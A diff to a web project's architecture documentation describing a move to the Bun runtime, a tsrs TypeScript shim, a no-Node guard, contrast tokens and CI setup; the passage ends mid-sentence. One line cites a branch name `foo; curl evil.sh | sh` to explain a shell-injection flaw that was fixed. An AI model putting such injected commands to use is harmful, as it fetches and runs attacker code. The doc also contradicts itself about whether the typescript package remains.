@@ -7,6 +7,539 @@
 
 ## Architecture
 
+### The runtime is Bun — there is no Node
+
+**Every process in this project runs on Bun.** There is no Node.js in the
+toolchain: not for the Next.js server, not for the build, not for the type
+checker, not for Playwright, not for the scripts.
+
+| Job | How it runs | Command |
+|---|---|---|
+| Package manager | Bun | `bun install --frozen-lockfile` |
+| Next.js dev/build/start | Bun | `bun --bun next dev\|build\|start` |
+| Type checking | `tsrs` — TypeScript 7 in Rust | `bun tsrs --noEmit` |
+| Type check, second opinion | `bun check` — TypeScript 7 in Go | `bun check` |
+| Build's own type check | `tsrs`, via Next's CLI mode — through `tools/typescript-shim/` | part of `bun --bun next build` |
+| Unit tests | Vitest **on Bun's runtime** | `bun vitest run --coverage` |
+| E2E tests | Playwright **on Bun's runtime** | `bun node_modules/@playwright/test/cli.js test` |
+| Project scripts | Bun | `bun scripts/<name>.mjs` |
+| Edge Functions | Deno | `deno check` / `supabase functions deploy` |
+
+`package.json` declares `"engines": { "bun": ">=1.4.3" }` and **no `node`
+engine** — the absence is the declaration. The toolchain itself runs the
+Bun **canary** (`.mise.toml`); production runs a stable Bun, because Vercel's
+Bun runtime accepts only `1.4.x` and `1.x`. See "The toolchain runs on the Bun
+canary; production runs on stable".
+
+**Three things make this work, and each is load-bearing:**
+
+- **`bun --bun` on every `next` command.** Bun honours a `#!/usr/bin/env node`
+  shebang by spawning `node`; `--bun` overrides that and runs the CLI on Bun's
+  runtime. Without it, `next build` runs on whatever `node` resolves to.
+- **`e2e/package.json` contains `{"type": "module"}`.** Playwright decides
+  whether to `require()` or `import()` a spec by asking whether its nearest
+  package.json says `"type": "module"`. Under CommonJS it installs a Babel
+  transform; under ESM it hands the file to the runtime's own loader. Bun's
+  loader strips TypeScript natively, so the ESM path is the one that works
+  without Node — and with it, Playwright's own transform is not needed at all.
+  The cost is that `e2e/` is ESM: `__dirname` does not exist there, so
+  `e2e/helpers/e2e-seeds.ts`, `e2e/auth.setup.ts` and
+  `e2e/admin-authenticated.spec.ts` use `import.meta.dirname`.
+- **Playwright is invoked as `bun node_modules/@playwright/test/cli.js`, never
+  as `./node_modules/.bin/playwright`.** The `.bin` shim is a `#!/usr/bin/env
+  node` script. `bunx playwright` would also be wrong for a different reason:
+  `playwright` is only a transitive dependency, so `bunx` would resolve it from
+  the registry and run a version the lockfile does not pin.
+
+**`tsrs` is the type checker — a Rust port of TypeScript 7.**
+[`tsrs`](https://github.com/oxc-project/tsrs) is Cloudflare and VoidZero's
+port of the TypeScript 7 compiler to Rust, published to npm as a native
+per-platform binary. It reads this repo's `tsconfig.json` and reports the
+same diagnostics as `tsc` — verified against TypeScript 7.1.0-beta's own
+native `tsc` on the clean tree and on five injected type errors (TS2345,
+TS2339, TS2322, TS7006, TS2554), with identical codes, messages and
+positions.
+
+**`bun check` is the second implementation, and that is the point.** `tsrs` is
+a Rust port; `bun check` is Bun's own typescript-go port. Two independent
+implementations of the same language agreeing on a clean tree is a claim a
+single implementation cannot make, and it costs about a second. CI runs both:
+`bun run typecheck` (tsrs) is the gate, `bun run typecheck:bun` is the
+cross-check. The Cloudflare and VoidZero teams say they are actively working
+to minimise divergence between the ports, which is exactly the divergence this
+second check would notice.
+
+**`tsrs` is pinned exactly, and it is the newest release.** `0.18.0` was
+verified three ways — the npm `latest` dist-tag, the publish-time-sorted
+version list, and the GitHub release list — because there is **no canary or
+beta dist-tag for `tsrs`**, only `latest` and a 2024 `snapshot`. The channel
+is not available to pin here, so the version is. The exact pin (rather than
+the `^` most dependencies use) is deliberate: `tsrs` gates the type check, and
+it moves fast — nine minor versions in nine days, 0.12.0 to 0.18.0 — so a
+caret range would let a release change a gate's output under a routine
+`bun install`. Its version also encodes the TypeScript commit it ports
+(`ts7.1.0-dev.20260929`), which is what makes the pin legible.
+
+**One difference, and it is only a difference of vocabulary.** For a
+missing-property assignment failure, `tsc` reports `TS2741` ("Property 'x' is
+missing in type A but required in type B") where the Rust port reports the
+more general `TS2322` — same line, same severity, same error, different code.
+Nothing here parses TS error codes (the suppression gate counts `@ts-ignore`
+comments, which suppress the error whatever its code), so the difference never
+reaches a decision. The reference implementation this was measured against
+(`typescript@7.1.0-beta`, the Go `tsc`) is no longer in the tree — see below —
+but the difference is a property of the two ports, not of the comparison.
+
+### The `typescript` package is a shim, and the build type-checks with `tsrs`
+
+**There is one type checker, not two.** The `typescript` npm package — the
+native Go `tsc` — is **not** in the dependency tree. What is there is
+`tools/typescript-shim/`: a local package *named* `typescript` whose `tsc`
+binary is backed by `tsrs`.
+
+**Next.js does not require the `typescript` package. It requires a package
+named `typescript` whose `bin` metadata exposes a `tsc` binary.** It finds it
+like this (`packages/next/src/lib/typescript/runTypeScriptCli.ts` in the Next
+source):
+
+```ts
+const packageJsonPath = resolveFrom(baseDir, 'typescript/package.json')
+// ...
+const tscBin = typeof packageJson.bin === 'string'
+  ? packageJson.bin
+  : (packageJson.bin?.tsc ??
+    Object.entries(packageJson.bin ?? {}).find(([name]) => /^tsc\d+$/.test(name))?.[1])
+```
+
+It then runs that binary **twice**, and the second call is not the one that
+is hard:
+
+| Call | Purpose | Answered by |
+|---|---|---|
+| `tsc --showConfig --project <tsconfig> --pretty false` | parsed as **JSON**, to read `compilerOptions.incremental` and `.composite` | the shim |
+| `tsc --project <tsconfig> --noEmit --declarationMap false --emitDeclarationOnly false` | the actual type check | `tsrs`, natively |
+
+`tsrs` implements the second call natively. It does **not** implement the
+first — it exits 5 with `error: --showConfig is not supported by tsrs.` — and
+Next.js treats a non-zero exit from that call as a hard failure:
+
+```ts
+if (result.exitCode !== 0) {
+  throw new Error(/* ... */)
+}
+```
+
+So the shim answers `--showConfig` itself and forwards everything else to the
+native Rust binary, which `tsrs`'s own resolver locates (it knows the platform,
+distinguishes musl from glibc on Linux, and honours a `TSRS_BINARY` override).
+The shim deliberately reuses that resolver rather than carrying a second copy
+of the platform table, so the two cannot drift.
+
+**The `--showConfig` answer is not `tsc --showConfig`, and it says so.**
+`tsc` reports the *computed* configuration: the merged chain, the compiler's
+defaults filled in, and the `files`/`include` globs expanded. The shim reports
+the merged tsconfig chain **as declared**. Next.js reads two booleans out of
+it and both are answered faithfully; the output carries a `_tsrsShim` marker
+so that a human reading the JSON is not misled.
+
+**The shim has no `exports` field, on purpose.** Next.js resolves
+`typescript/package.json` with `resolveFrom`, and a package whose `exports`
+map does not expose `./package.json` would fail to resolve — the build would
+report a missing dependency for a package that is present.
+
+**`experimental.useTypeScriptCli` is set explicitly even though it is the
+default in Next 16.4.** It has to be: the shim has no `lib/typescript.js`,
+so the API path would fail to find a compiler. A default that silently
+flipped would break the build, and the failure would be a dependency message
+rather than anything about type checking.
+
+**`next.config.ts` is the only place the shim is referenced.** Nothing else
+in the repository knows it exists, and nothing else should.
+
+**What this is not.** The npm `typescript` package was a **Go** binary, not
+Node.js, so this is toolchain consolidation rather than runtime removal — the
+"no Node.js anywhere" claim was already true without it. What it buys is one
+compiler instead of two, a build-time check at Rust speed, and one fewer
+implementation to keep in step with the language.
+
+**One thing to know if `tsrs` ever implements `--showConfig`:** the shim
+should delegate to it and lose the JSONC parsing. That is the shape of the
+debt, and it is the reason the shim is small and marked as a shim rather
+than presented as a compiler.
+
+**`bunfig.toml` runs package.json scripts on Bun's own shell**, not the
+system `sh`. Bun's shell is a real shell with its own parser — cross-platform
+(the same script runs on Windows without a POSIX layer) and independent of what
+`/bin/sh` happens to be on the host. For a project whose premise is that the
+runtime is Bun, having the *scripts* fall back to the system shell is an
+inconsistency worth removing. The one shell construct in this
+`package.json` — `test -d .git && lefthook install || true` — was verified
+against it. The lefthook hooks never went through it: they are invoked as
+`bun scripts/hooks/<name>.mjs`, so they were always Bun processes.
+
+**Vitest stays, and runs on Bun.** The unit suite's surface is
+`vi.fn` (547 uses), `vi.mock` (142), `vi.hoisted` (126), `vi.stubGlobal` (37)
+and `vi.spyOn` (28) across 131 files. Porting that to `bun test` is not a
+mechanical rename — Bun's `mock.module` has different hoisting and
+module-resolution semantics from `vi.mock` + `vi.hoisted`, and a partial port
+would leave 895 tests asserting against a mock that no longer behaves like the
+one they were written for. Vitest executing on Bun's runtime is the same
+runtime with none of that risk.
+
+**"Vitest on Bun" means the workers too, not just the CLI.** This was
+measured rather than assumed: inside a test, `process.execPath` is the `bun`
+binary, `Bun.version` is `1.4.3`, and `process.versions.node` reads `26.3.0`
+— Bun's Node-compatibility string, not a Node runtime. Vitest's workers are
+spawned with `process.execPath`, so the same is true of the Playwright
+workers. The practical consequence is that `Bun.file`, `Bun.write` and
+`Bun.env` work directly inside a test file, which is why the unit tests use
+them rather than `node:fs`.
+
+**One known Bun defect is mitigated by the runtime, not by this project.** Bun
+does not restore the AsyncLocalStorage context for `unhandledRejection`
+listeners ([oven-sh/bun#39847](https://github.com/oven-sh/bun/issues/39847)),
+so Next's filter for its own prerender-control-flow rejects cannot see the
+aborted work unit and forwards them to its logger. On Bun that is ~800
+`AbortError` stack traces per e2e run that Node absorbs silently — measured
+at 0 under Node and 871 under Bun for the identical 95-spec suite. It is
+**not** suppressible from here: Next's filter holds its captured listeners
+privately, and Bun's `--unhandled-rejections` modes do not apply because Next
+installs its own handler — the rejects are logged by Next's logger, not by
+Bun's default handler. The upstream fix is
+[oven-sh/bun#31721](https://github.com/oven-sh/bun/pull/31721), still unlanded
+— re-measure and re-test when it ships.
+
+The cost is real and is recorded in
+[`docs/bun-runtime-spike.md`](./docs/bun-runtime-spike.md): the e2e gate is
+slower on a Bun-hosted server, and the log volume is two orders of magnitude
+higher.
+
+### The Bun-native execution layer
+
+The migration removed Node.js as a *runtime*. What it did not do is pretend
+that `node:fs` is Node.js — it is not. Bun implements `node:fs`, `node:path`,
+`node:crypto`, `node:os`, `node:url` and `node:http` natively, so importing
+one involves no Node binary and no second runtime. Blocking those would
+trade a real guarantee for a cosmetic one.
+
+What *did* start another runtime was `node:child_process`, and that is gone
+from every file in this repository. It was also, quietly, a **shell-injection
+surface**: `execSync` and `execFile` take a command *string*, so `/bin/sh`
+parses it, and any interpolated value — a branch name, a file path, a git ref
+— becomes shell syntax rather than an argument. `post-checkout-deps.mjs`
+interpolated two `argv` values straight into a command line, which made a
+checkout of a branch named `foo; curl evil.sh | sh` a command line.
+
+**`scripts/bun-exec.mjs` is the one way this repository runs a command.**
+
+| Function | Returns | Throws on non-zero |
+|---|---|---|
+| `run(argv, opts)` | `{ exitCode, stdout, stderr }` | never |
+| `runText(argv, opts)` | stdout as a string | yes |
+| `tryRunText(argv, opts)` | stdout, or `null` | never |
+| `runInherit(argv, opts)` | the exit code, output attached to the terminal | never |
+| `runAsync` / `runTextAsync` / `runOrThrow` | the async equivalents | `runOrThrow` only |
+
+Every function takes an **argv array**, and `Bun.spawnSync` never goes
+through a shell — so an interpolated value is an argument, not a command. The
+array form is also faster (no `/bin/sh` fork to parse a command line that was
+never dynamic) and it removes the `maxBuffer` dance, because `execFileSync`
+throws when a command's output exceeds a limit while Bun buffers it without
+one.
+
+**A non-zero exit is not an exception.** It is ordinary for `grep -q`, `git
+diff --quiet` and `bun audit` (which exits non-zero when it finds advisories,
+having still written its report to stdout), and code that has to catch an
+exception to read a status is where "swallow the error" bugs live. `run`
+returns the status; the caller decides what it means.
+
+**Bun's own file API, not `node:fs`, for file reads and writes.** `Bun.file(p)
+.text()` and `Bun.write(p, data)` replace `readFileSync` and `writeFileSync`
+throughout `scripts/`, `e2e/` and the unit tests. This is not only style:
+`readFileSync` blocks Bun's event loop, and `Bun.file(p).text()` does not.
+`Bun.Glob` replaces `readdirSync` for listing files, `Bun.YAML.parse` replaces
+the Ruby `Psych` call the workflow guard used to make, and `Bun.sleep(3000)`
+replaces forking a `sleep` process to do nothing for three seconds.
+
+**`node:fs` remains for exactly four things**: `readdir` with entry types,
+`mkdir`, `rm` and `mkdtemp`. Bun has no first-class directory API that
+carries an entry type — `Bun.Glob` lists paths but cannot say which of them is
+a directory — and there is no `Bun.tempdir` at all, so a hand-rolled
+mkdir-plus-random-name would be a worse `mkdtemp` than the one in the
+standard library. They are still Bun's implementations.
+
+**`node:path` is everywhere and should stay.** Bun has no path API, and
+`node:path` is the portable standard one. `node:os`'s `tmpdir` and
+`node:url`'s `fileURLToPath` are the same story. `node:crypto` is the one
+that went: `crypto.subtle` covers what this repository used it for, and it
+is a Web standard rather than a Node module.
+
+**Two `node:` builtins had Bun equivalents and now use them.**
+`scripts/mock-notify-contact.mjs` is a `Bun.serve` server rather than a
+`node:http` one — the handler returns a `Response`, the body is parsed with
+`req.json()` instead of a hand-rolled stream listener, and the connection
+lifetime is one option (`idleTimeout`, which counts in **seconds** and is
+capped at 255) instead of `keepAliveTimeout` plus `headersTimeout`.
+`scripts/check-peer-deps.mjs` uses `Bun.resolveSync(specifier, parent)`
+rather than `createRequire(...).resolve(specifier, { paths })`; the two were
+verified equivalent in the case that distinguishes them, scoped to
+`tinyglobby` both find the *nested* `picomatch` while from the root both find
+the hoisted one, and the gate still reports 58 and 78 relationships.
+
+**The e2e suite runs on Bun's runtime too, not just Bun's package manager.**
+Playwright is launched as `bun node_modules/@playwright/test/cli.js`, and its
+workers are spawned with `process.execPath` — so the worker process is Bun
+(verified: `Bun.version` and `process.versions.bun` both report 1.4.3 inside a
+spec). That is why the specs read `Bun.env` and `Bun.file` directly, and why
+`e2e/auth.setup.ts` writes its storage state with `Bun.write` — which creates
+the parent directory on the way, so the explicit `mkdir` went away. Playwright's
+own `storageState({ path })` also creates the parent directory (verified), so
+that `mkdir` was never needed at all.
+
+**Bun loads `.env` and `.env.local` natively.** Nineteen scripts imported
+`dotenv` and called `dotenv.config({ path: ... })`, and `dotenv` was **never
+a declared dependency** — it resolved only because it is a transitive
+dependency of the Vercel CLI, so those scripts failed to import on a clean
+`bun install`. Bun's own loader reads `.env`, `.env.local` and the per-mode
+variants, with the shell's environment taking precedence, so the import and
+the call were both redundant as well as broken. `Bun.env` reads a variable;
+`process.env` also works, because Bun populates it.
+
+**But Bun reads those files at *startup*, and it chooses which ones from the
+`NODE_ENV` in the environment at that moment.** Measured:
+
+| `NODE_ENV` at startup | `.env` | `.env.local` | `.env.test` |
+|---|---|---|---|
+| unset | read | **read** | — |
+| `development`, `production`, `staging` | read | **read** | — |
+| `test` | read | **not read** | read |
+
+So a shell that exports `NODE_ENV=test` gets neither `.env.local` nor
+`.env.test` unless it exists, and anything that depended on `.env.local`
+silently loses it. This is why `playwright.config.ts` still parses
+`.env.local` by hand: Playwright sets `NODE_ENV=test` *inside* its own code,
+which is too late to change what Bun already loaded, so the usual local run
+is fine — but a shell that exports `NODE_ENV=test` sets it before Bun
+starts, and then the manual parser is the only source. It reads like dead
+code. It is not, and it says so in a comment.
+
+**One place deliberately did *not* move to a Bun-only API.**
+`src/lib/svix-signature.ts` decodes base64 with `Buffer.from`, and
+`Uint8Array.fromBase64` is the cutting-edge replacement. It was left alone:
+no route in `src/` declares `export const runtime = 'edge'`, so the handlers
+run on the default Next.js runtime, and `Uint8Array.fromBase64` is a
+Bun/Deno/modern-V8 API that is **not** in Node 20 or 22. The unit suite runs
+on Bun, so the swap would have been green in tests and thrown at runtime on
+a Node function — a webhook verifier failing closed on every real Resend
+event, with nothing failing until production did. `Buffer` is portable and
+the code is already validated against Svix's own test vector.
+
+**Where WebCrypto replaced `node:crypto`, it was the right trade.** The
+e2e suite's TOTP helper and the two Stripe-webhook signers used
+`node:crypto`'s `createHmac`; they now use `crypto.subtle`, which is a **Web
+standard** — present in Bun, Deno, Node and every browser — and produces
+byte-identical output. Unlike `Uint8Array.fromBase64`, WebCrypto is not a
+Bun-only API, so it carries none of the risk above; it is *more* portable
+than what it replaced, and it removes the last `node:` specifier from `e2e/`
+and `scripts/`. `Bun.CryptoHasher` is not a substitute: it does not do HMAC
+at all (it throws "key must be a string or buffer" for an HMAC key).
+
+The TOTP helper is **SHA-1**, because RFC 6238 specifies SHA-1 for TOTP and
+the RFC's own test vectors are the proof — they are external, so no
+self-consistent mistake satisfies them. `e2e/mfa-challenge.spec.ts` checks
+six of them plus the lowercased-and-space-padded secret case; every one
+still matches after the conversion. The cost of the conversion is that
+`crypto.subtle` is asynchronous where `createHmac` was not, so
+`generateTotp` returns a promise — every call site was already inside an
+async function.
+
+One difference worth knowing: `Uint8Array.prototype.toBase64({ alphabet:
+'base64url' })` keeps the `=` padding, where Node's `toString('base64url')`
+strips it. `scripts/seed-e2e-users.mjs` strips it explicitly, so a generated
+password is byte-identical to what it was before.
+
+**A guard keeps it done.** `scripts/hooks/no-node-runtime.mjs` blocks Node
+shebangs, `node:child_process`, a second package manager (`npm`, `npx`,
+`yarn`, `pnpm`), the `actions/setup-node` workflow step, an `engines.node`
+declaration, and imports of `node-fetch` or `dotenv`. Without it the failure
+mode is not a red build — it is a green local machine and a red runner,
+because a `#!/usr/bin/env node` shebang works perfectly on a laptop that
+still has Node and breaks on every machine this project actually runs on.
+
+**The guard has two halves, and the staged-files half was the one that gave
+false confidence.** The pre-commit hook passes `{staged_files}`, so it catches
+a *reintroduction* — someone adds a Node shebang and the commit is refused. It
+cannot catch a violation that arrived another way: a file committed before the
+guard existed, a merge, a regeneration. Those sit there indefinitely while the
+guard keeps reporting a clean tree, because it is only ever shown the staged
+subset. The `--all` pass in CI is the half that says something about the
+current state of the repository rather than about the next commit.
+
+Worth recording because the CI step was already written and already *looked*
+right — `bun scripts/hooks/no-node-runtime.mjs --all` — while the guard
+treated `--all` as a filename, read nothing, and exited 0. A flag that the
+tool does not understand is not a failure; it is a path that does not exist,
+and a guard that skips what it cannot read is a control that reports success
+while measuring nothing. The same shape as `vercel pull` returning an empty
+string for a `sensitive` variable, and as a `deploy` step that runs at all.
+
+The tree walk also skips what is not this repository's runtime: the vendored
+`.agents/skills/` and `agent/skills/` trees (pinned in `skills-lock.json` and
+rewritten by `bunx skills update`), the gitignored `.kiro/` and `scratch/`
+directories, and Markdown — because prose mentioning `npm install -g vercel` is
+a sentence about the past, not a command. A guard that fires on prose teaches
+people to reach for the bypass.
+
+### Three runtimes, none of them Node
+
+The claim "no Node.js anywhere" is true, and it is true for a reason that is
+not obvious: **the deployed app runs on two runtimes, and neither is Node.**
+
+| Surface | Runtime | Node.js? |
+|---|---|---|
+| Serverless functions — route handlers, ISR renders | Bun 1.4.x (`bunVersion` in `vercel.json`) | no |
+| Routing middleware (`middleware.ts`) | Edge — V8, no Node compatibility layer | no |
+| Build, type check, unit tests, e2e, every script | Bun | no |
+
+**The middleware is on the Edge runtime, and that is deliberate.** Next.js 16
+deprecated the `middleware` file convention and renamed it to `proxy`, and the
+rename is not housekeeping — it moves the code onto Node.js. Measured on this
+repository, both ways, from the build output:
+
+- `middleware.ts` compiles to the **Edge** runtime. The build manifest lists
+  `server/edge/chunks/…` and the `edge-wrapper` template.
+- `proxy.ts` compiles to a **Node** bundle — `server/middleware.js`, a
+  CommonJS entry — and Next.js's own version history says why: *"Middleware is
+  deprecated and renamed to Proxy. Proxy defaults to the Node.js runtime."*
+  The build also rejects `export const runtime` inside a proxy file with
+  *"Proxy always runs on Node.js runtime."*
+
+So **the file convention decides the runtime**, and the current convention is
+the one that keeps this project off Node.js. `middleware.ts` therefore stays,
+with the reasoning recorded in the file's own docblock so a future
+contributor does not "fix" the deprecation by reintroducing Node.
+
+**Do not add `export const runtime` to `middleware.ts` either.** Next.js
+accepts only `'edge'` and `'nodejs'`; `'nodejs'` would pin the auth gate to
+Node, and unlike a build error, a runtime that differs between environments
+fails at the first request rather than at the build.
+
+**The Edge runtime is not Bun, and pretending otherwise would be its own
+mistake.** It is V8 without the Node compatibility layer, which is why
+`src/sentry.edge.config.ts` exists separately from `src/instrumentation.ts` —
+the middleware's errors are reported by a different Sentry client because
+they are raised in a different runtime. It also means the middleware cannot
+use `node:` builtins, which is why `createServerClient` is the right call
+there and a raw `pg`/socket client would not be.
+
+### `npx` exists, and it is Bun
+
+`bin/npx` in this repository is a shim that runs `bun x`. It is installed to
+`~/.local/bin/npx` (which is on PATH here) and it exists because **Next.js
+does not know about Bun.**
+
+Next's package-manager detection (`get-pkg-manager.js`) checks for
+`yarn.lock`, `pnpm-lock.yaml` and `package-lock.json`. A Bun project has none
+of them, so it falls through to probing `yarn --version` and `pnpm --version`
+and finally reports `npm` — and `get-npx-command.js` then returns the literal
+`npx --yes`. On a machine with no Node.js that is a dead end:
+
+```
+$ bun x next@16.4.2 upgrade --agent latest
+⨯ Could not prepare the upgrade: Executable not found in $PATH: "npx"
+```
+
+`npx <pkg> [args]` and `bun x <pkg> [args]` are the same operation, so the
+shim maps one onto the other. That is what makes `next upgrade --agent`,
+`next dev`'s agent hooks, and the `@next/codemod` runs work here at all.
+
+Two flags are not the same and are handled explicitly: `--yes` is npm's
+auto-confirm, which Bun has no equivalent for and never needs, so it is
+dropped; and `--bun` is added, so a package cannot silently fall back to a
+Node runtime that does not exist.
+
+### The toolchain runs on the Bun canary; production runs on stable
+
+**The developer toolchain and CI run the latest Bun canary.** The project
+pins it in `.mise.toml`:
+
+```toml
+[tools]
+"npm:bun" = "canary"
+```
+
+Three things about that line are load-bearing.
+
+**The `npm:` backend is deliberate.** Bun's GitHub releases do not publish a
+`canary` tag with a matching archive — mise's `core:bun` backend fails with a
+404 on `bun-vcanary`. The npm package *does* publish a `canary` dist-tag with
+a real platform binary for every supported target, so the npm backend is the
+one that resolves.
+
+**It is pinned to the channel, not to a version.** Bun cuts canaries from the
+release branch, so a canary's version number is **not** monotonic against the
+stable releases: a canary can carry a lower number than the stable release
+that superseded it (`1.4.3-canary.20261019.1` ships a `1.4.4-canary`
+binary). Pinning a canary *version* would be false precision. The channel is
+the unit that means "the latest canary".
+
+**The old CI pin was broken, not merely conservative.** CI asked
+`oven-sh/setup-bun` for `BUN_VERSION: "1.4.4"`, and `bun-v1.4.4` has never
+existed as a GitHub release — `setup-bun` resolves a strict-semver version to
+`bun-v<version>` directly, so that step was a 404 on every job. The
+`canary` channel is resolved from the `refs/tags/canary` tag, which does
+exist.
+
+**Production still runs a stable Bun.** `vercel.json` sets
+`"bunVersion": "1.4.x"`, and Vercel's Bun runtime accepts only `"1.4.x"` and
+`"1.x"` — a canary cannot be deployed there. So:
+
+| Where | Bun | Why |
+|---|---|---|
+| Developer machine | canary | `.mise.toml`; the toolchain should track the frontier |
+| CI | canary | `BUN_VERSION: "canary"`; the same reason, and the same fleet |
+| Vercel production | `1.4.x` (stable) | the only values Vercel's Bun runtime accepts |
+
+The divergence is deliberate and bounded: the runtime that *executes* the
+application is pinned and stable, and the runtime that *installs and builds*
+it tracks the canary. `bun.lock` pins the dependency graph either way, so a
+canary Bun can change how the tree is installed but not what is in it.
+
+### The project is typed against Bun, not against Node
+
+`tsconfig.json` carries an explicit `types` allowlist — `bun-types`, `node`,
+`react`, `react-dom` — so the global type surface is a decision rather than
+whatever happens to be in `node_modules/@types`. `bun-types` is Bun's own type
+package; it is what makes `Bun.file`, `Bun.spawn` and the `bun:*` modules
+type-checked here.
+
+**`typescript` is now TypeScript 7.1.0-beta**, and it is the native
+compiler — a Go binary per platform, not the JavaScript implementation. It
+ships a `tsc` binary and no `lib/typescript.js`, which is why the project
+needs `experimental.useTypeScriptCli` (see "Deferred Upgrades"). The
+`typescript` dependency is what Next's build runs, and `tsrs` is what the
+project's own gate runs; both are TypeScript 7 compilers, and both are
+native binaries that need no JavaScript runtime at all.
+
+**`@types/node` is still present, and it cannot be removed.** `bun-types`
+*extends* Node's compatibility layer rather than replacing it — its
+`index.d.ts` opens with `/// <reference types="node" />` and the package
+depends on `@types/node` outright — and Next's own `next/types/global.d.ts`
+carries the same reference. The `node:` builtin module declarations the
+scripts import (`node:fs`, `node:child_process`) come from there too. So
+"remove Node" means the *runtime* and the *toolchain*, which is done; the
+*type declarations* are a compatibility surface Bun itself depends on.
+
+**One consequence is load-bearing, and it is a test-shaped one.** Bun's
+`fetch` is the Fetch API plus a `preconnect` member, so `globalThis.fetch` is
+not the DOM's `fetch` and a `vi.fn()` is not assignable to it. Rather than
+cast thirty-four times across six suites, there is one helper:
+[`src/lib/__tests__/fetch-mock.ts`](./src/lib/__tests__/fetch-mock.ts). It
+*completes* a mock — adding `preconnect` as a no-op — so the object genuinely
+is a `typeof fetch`, and it holds the repository's only fetch-mock cast, in
+one documented place. A new suite that stubs `fetch` uses `installFetchMock`
+rather than reaching for the global directly.
+
 ### App Router structure
 - **Server Components** handle all data fetching via `createClient` from `@supabase/ssr`.
 - **Client Components** are scoped to interactive leaves: Cart, Wishlist, command palette, Stripe checkout.
@@ -251,7 +784,8 @@ Tokens are defined in `src/app/globals.css` via `@theme`. No `tailwind.config.*`
 | `--primary-on-dark` | `#8ec5ff` | Brand blue as **display text on dark** (hero highlights) |
 | `--primary-on-dark-muted` | `#7cbaff` | Brand blue as **eyebrow/label text on dark** (>=4.8:1 on raised cards) |
 | `--accent` | `#d97706` | Amber — donate CTA, warnings. **Surface, not text** |
-| `--accent-gold` | `#f59e0b` | Active nav indicators, dark-surface accents |
+| `--accent-gold` | `#f59e0b` | Active nav indicators, dark-surface accents. **Surface/border, not text** |
+| `--accent-gold-on-dark` | `#fcd34d` | Gold as **text on a dark surface** (5.30:1 on the gold-tinted chip, 10.93:1 on `--surface-deep`) |
 | `--accent-red` | `#dc2626` | Destructive actions, errors |
 | `--accent-lime` | `#d1ff00` | Dark-surface non-text accent only |
 | `--surface-muted` | `#f4f8ff` / `#1a3768` | Secondary panels, trays, inputs |
@@ -269,6 +803,17 @@ surfaces. On an amber background use `text-ink-strong` (7.2:1); on a dark
 background use the `--ink-*-on-dark` pair. The axe gate in `e2e/a11y.spec.ts`
 enforces this — do not "fix" a failing contrast check by swapping to a token
 without re-measuring.
+
+**`--accent-gold` is text-unsafe on dark too, and that one is subtler.**
+`#f59e0b` measures 7.34:1 on `--surface-deep`, so it looks safe on a dark
+page — but only 3.56:1 on a gold-tinted chip, because the tint lifts the
+background to `#495467` and the amber has nowhere left to go. The three civic
+badges that tinted their own background were failing axe for exactly that,
+at 3.56:1 and 4.03:1 against a 4.5:1 bar for 11px bold uppercase text. Use
+`--accent-gold-on-dark` (`#fcd34d`) for gold text on dark: 5.30:1 on the
+tinted chip, 6.00:1 on the lighter variant, 10.93:1 on `--surface-deep`. It
+is the same shape as the `--primary-on-dark` fix below — a colour that works
+as *text* on dark had no token, so the pages reached for the surface one.
 
 ### Radius, elevation and motion tokens
 `@theme` also defines `--radius-*` (`xs`…`3xl`), `--shadow-*` (`card`, `raised`,
@@ -370,7 +915,7 @@ it in the tab order while invisible on desktop. Gate the reveal with the
 4. **No console.log in committed code** — enforced by oxlint.
 5. **No layout shift** — always provide width/height on `next/image`; use `aspect-ratio` utilities for unknown-dimension embeds. For a CMS image, **measure the size rather than reserve a guess**: `measureImageSize` reads the intrinsic dimensions from the bytes, and a block that cannot be measured must render in a fixed frame — never neither. See [`docs/content-editor.md`](./docs/content-editor.md#an-image-is-measured-or-the-frame-is-fixed--never-neither).
 6. **Server-only env reads** — `process.env.SUPABASE_SECRET_KEY` etc. are accessed as dotted properties, never spread into objects, never imported into client modules. Public `NEXT_PUBLIC_*` vars are safe to access anywhere.
-7. **Exact dependency versions** — use `^` only; pin via `overrides` for any package with a known CVE.
+7. **Exact dependency versions** — use `^` only; pin via `overrides` for any package with a known CVE. `bun audit` is what makes "known CVE" computable, and `bun run audit:deps` is the gate that enforces it. See [Dependency vulnerabilities](#dependency-vulnerabilities).
 8. **MFA guards** — account-mutating operations must check MFA enrollment status server-side. See [`docs/mfa.md`](./docs/mfa.md).
 9. **A `'use server'` module may only export async functions**, and the build
    enforces it — `Error: Only async functions are allowed to be exported in a "use
@@ -398,6 +943,8 @@ The team shares one Fluid Active CPU pool (4 hrs / rolling 30 days). **Do not re
 | Checkout rate limit | 10/min/IP | Stripe fraud + CPU protection |
 | Contact rate limit | 3/10min/IP | Anon-key flood protection |
 | Pre-push e2e | Playwright when push touches runtime surfaces | Delivery gate without punishing docs-only pushes |
+| Function runtime | `bunVersion: "1.4.x"` in `vercel.json` | The serverless functions — route handlers, ISR renders — run on Bun. `"1.4.x"` is the Rust rewrite — `"1.x"` resolves to 1.3.14, the version with the reported Next 16.3 build failure. **This does not cover the middleware**, which runs on the Edge runtime — see [Three runtimes, none of them Node](#three-runtimes-none-of-them-node). It is also the only value Vercel accepts for a canary-free deployment: the toolchain runs the Bun canary, production cannot |
+| Build command | `bun run --bun next build` | Vercel requires the Bun runtime for the build when the functions run on Bun and the app uses ISR. This app does — every route carries `revalidate: 900` |
 
 When the project moves to Vercel Pro, revisit `cacheLife: "minutes"` for price and stock freshness.
 
@@ -515,6 +1062,44 @@ The required set lives in **`scripts/ci-env.mjs`**, and
 `scripts/check-ci-env.mjs` diffs it against the workflow files. It runs in the
 pre-commit gate, so drift fails at commit time rather than at 3am.
 
+- **The runner host has no Node, and that is deliberate.**
+  `scripts/setup-runner.sh` used to install Node 20 "as a fallback for some
+  tools"; nothing needed it, and a second runtime beside Bun is how a project
+  ends up running under Node in production after a job quietly falls back to
+  it. The one Node left on that host is the GitHub Actions runner's *own*
+  bundled runtime, which is what executes Node-based actions such as
+  `actions/checkout` — it lives inside the runner package and is independent
+  of the system Node. Nothing in this repository's workflows uses
+  `actions/setup-node`, and no project command can reach the runner's copy.
+- **One Node runtime remains, and it is outside the project.** The GitHub
+  Actions runner's own bundled copy (above) executes Node-based actions such
+  as `actions/checkout`. It lives inside the runner package and is
+  independent of the system Node: nothing in this repository's workflows
+  uses `actions/setup-node`, and no project command can reach the runner's
+  copy.
+- **Trunk is gone, and it was the only thing on a developer machine that
+  pulled a Node runtime.** `.trunk/trunk.yaml` enabled `node@26.8.1`,
+  because two of trunk's linters — `markdownlint` and `svgo` — are npm
